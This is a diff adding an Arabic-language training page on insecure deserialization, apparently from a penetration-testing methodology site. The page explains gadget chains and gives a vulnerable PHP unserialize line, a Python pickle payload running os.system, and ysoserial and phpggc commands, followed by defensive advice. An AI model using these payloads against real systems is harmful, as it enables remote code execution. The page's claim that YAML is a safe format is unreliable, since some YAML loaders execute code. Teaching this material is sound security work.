+    <div style="margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap;">
+      <span class="badge badge-tool">🛠️ ysoserial · phpggc · Object Serialization · Pickle</span>
+      <span class="badge badge-info">📋 OWASP Top 10: Software and Data Integrity Failures</span>
+      <span style="background: rgba(255,85,85,0.15); color: #ff5555; padding: 4px 12px; border-radius: 20px; font-size: 0.8rem; font-weight: bold;">CVSS Impact: Critical (Remote Code Execution)</span>
+    </div>
+  </div>
+
+  <!-- ═══ SECTION 2: THEORY — Serialization Mechanics ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>📚 النظرية — ما هي Serialization و Deserialization؟</h3></div>
+    <div style="line-height: 1.8; color: var(--text-secondary);">
+      <p>
+        الـ <strong>Serialization (التسلسل):</strong> هي عملية تحويل كائن برمجي معقد في الذاكرة (Object) إلى تنسيق مسطح من البيانات (مثل بايتات ثنائية أو نص JSON/XML) ليتمكن التطبيق من حفظه في ملف أو إرساله عبر الشبكة.
+        <br>الـ <strong>Deserialization (فك التسلسل):</strong> هي العملية العكسية — إعادة بناء الكائن البرمجي الكامل في الذاكرة من خلال قراءة البيانات المسطحة الممررة.
+      </p>
+
+      <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 20px;">
+        <div>
+          <h4 style="color: var(--tool-color);">🚨 ثغرة فك التسلسل غير الآمن (Insecure Deserialization)</h4>
+          <p>
+            تحدث الثغرة عندما يقوم التطبيق بفك تسلسل بيانات مرسلة من جهة غير موثوقة (المستخدم) دون التحقق من صحتها. يستغل المهاجم هذه الثغرة عبر حقن كائن من فئة معروفة (Class) يمتلك وظائف خاصة تُستدعى تلقائياً عند فك التسلسل (تُعرف بـ <strong>Magic Methods</strong>).
+          </p>
+        </div>
+        <div>
+          <h4 style="color: #ff6e27;">🔗 سلاسل الأدوات (Gadget Chains)</h4>
+          <p>
+            لا يملك الكائن المحقون أثراً ضاراً بمفرده في الغالب، ولكن عبر استغلال الـ Magic Methods، يتم تمرير التحكم برمجياً من كائن لآخر كأحجار الدومينو (Gadget Chain) حتى يصل التنفيذ في النهاية إلى دالة قادرة على تشغيل الأوامر (مثل <code>Runtime.getRuntime().exec()</code> في جافا).
+          </p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══ SECTION 3: ATTACK ANATOMY ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🔬 تشريح الهجوم والأساليب البرمجية</h3></div>
+    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+      <div>
+        <h4 style="color: var(--tool-color);">🐘 فك التسلسل في PHP (Magic Methods)</h4>
+        <p style="font-size: 0.9rem; color: var(--text-secondary);">
+          تستخدم لغة PHP دوال سحرية تُنفذ تلقائياً عند مراحل معينة من عمر الكائن:
+          <br><code>__wakeup()</code> عند فك التسلسل.
+          <br><code>__destruct()</code> عند تدمير الكائن وحذفه من الذاكرة.
+          <br><code>__toString()</code> عند محاولة معاملة الكائن كنص.
+        </p>
+        <p style="font-size: 0.9rem; color: var(--text-secondary);">مثال لكود ضعيف بالـ PHP:</p>
+        <pre style="background: #282a36; padding: 10px; border-radius: 6px; color: #f8f8f2;" dir="ltr"><code>// ❌ BAD: Deserializing raw user input
+$user = unserialize($_COOKIE['user_session']);</code></pre>
+      </div>
+      <div>
+        <h4 style="color: #ff6e27;">🐍 فك التسلسل في بايثون (Pickle Module)</h4>
+        <p style="font-size: 0.9rem; color: var(--text-secondary);">
+          في بايثون، تُستخدم مكتبة <code>pickle</code> للتسلسل. استدعاء دالة <code>__reduce__()</code> داخل الكائن أثناء فك التسلسل يتيح تحديد كود كامل ليتم تنفيذه فوراً.
+        </p>
+        <pre style="background: #282a36; padding: 10px; border-radius: 6px; color: #f8f8f2;" dir="ltr"><code># Python exploit payload generating using pickle
+import pickle
+import os
+
+class Exploit(object):
+    def __reduce__(self):
+        return (os.system, ('whoami',))
+
+# Serialize payload
+print(pickle.dumps(Exploit()))</code></pre>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══ SECTION 4: TOOLS MATRIX ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🛠️ أدوات توليد سلاسل الاستغلال (Gadget Generatos)</h3></div>
+    <div>
+      <table class="cyber-table" style="width: 100%;">
+        <thead>
+          <tr>
+            <th>الأداة</th>
+            <th>اللغة المستهدفة</th>
+            <th>الوصف وآلية العمل</th>
+            <th>أمر شائع</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><strong style="color: var(--tool-color);">ysoserial</strong></td>
+            <td>Java</td>
+            <td>أداة ضخمة لتوليد حمولات RCE لثغرات فك التسلسل في جافا عبر استغلال سلاسل Gadget معروفة في مكتبات شائعة (مثل CommonsCollections).</td>
+            <td><code>java -jar ysoserial.jar CommonsCollections1 "xterm"</code></td>
+          </tr>
+          <tr>
+            <td><strong style="color: #ff6e27;">PHPGGC</strong></td>
+            <td>PHP</td>
+            <td>مكتبة تحتوى على سلاسل استغلال جاهزة لمختلف إطارات العمل والمكتبات الخاصة بـ PHP (مثل Laravel, Symfony).</td>
+            <td><code>./phpggc Laravel/RCE1 system "id"</code></td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- ═══ SECTION 5: DEFENSE & REMEDIATION ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🛡️ الحماية والدفاع — تأمين فك تسلسل البيانات</h3></div>
+    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+      <div>
+        <h4 style="color: #50fa7b;">✅ أساليب برمجية آمنة</h4>
+        <ul style="line-height: 2; color: var(--text-secondary); font-size: 0.9rem;">
+          <li><strong>Avoid raw serialization:</strong> تجنب استخدام فك التسلسل الافتراضي للغات البرمجية على بيانات قادمة من المستخدمين كلياً.</li>
+          <li><strong>Use Safe Formats:</strong> استبدل التنسيقات الثنائية بتنسيقات بيانات مسطحة بسيطة وآمنة لا تملك منطقاً تنفيذياً بداخلها مثل <strong>JSON</strong> أو <strong>YAML</strong>.</li>
+        </ul>
+      </div>
+      <div>
+        <h4 style="color: #00e5ff;">🔒 قيود فحص الأنواع (Look-Ahead Deserialization)</h4>
+        <ul style="line-height: 2; color: var(--text-secondary); font-size: 0.9rem;">
+          <li><strong>Class Whitelisting:</strong> إذا اضطررت لاستخدام فك التسلسل، قم بتطبيق التحقق المسبق (Look-ahead) لقصر الفك على قائمة بيضاء صارمة من الفئات المسموحة فقط وتدمير أي كائن غريب قبل بنائه في الذاكرة.</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+</div> <!-- end meth-viewer -->
   </div> <!-- end methodology-app -->
 <!-- Popup Modal structure for alert testing -->
   <div class="popup-overlay" id="popupOverlay"></div>
@@ -10411,10 +12244,10 @@ if __name__ == "__main__":
         mermaid.initialize({ startOnLoad: false, theme: 'dark' });
     }
   </script>
-  <script src="js/components.js?v=1784851772"></script>
-  <script src="js/methodology.js?v=1784851772"></script>
-  <script src="js/quiz_engine.js?v=1784851772"></script>
-  <script src="js/payload_generator.js?v=1784851772"></script>
+  <script src="js/components.js?v=1784852602"></script>
+  <script src="js/methodology.js?v=1784852602"></script>
+  <script src="js/quiz_engine.js?v=1784852602"></script>
+  <script src="js/payload_generator.js?v=1784852602"></script>
   <button id="mobileFab" class="mobile-fab" onclick="openQuickJump()">
     🔍
   </button>
